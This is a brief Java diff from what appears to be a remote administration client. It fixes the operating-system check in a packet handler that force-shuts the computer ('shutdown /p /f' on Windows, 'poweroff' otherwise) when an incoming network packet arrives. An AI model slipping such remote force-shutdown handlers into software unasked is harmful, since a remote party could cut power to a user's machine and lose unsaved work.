@@ -10,7 +10,7 @@ public class Packet28ShutdownComputer extends AbstractIncomingPacket {
 	@Override
 	public void read() throws Exception {
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Runtime.getRuntime().exec("shutdown /p /f");
 			} else {
 				Runtime.getRuntime().exec("poweroff");
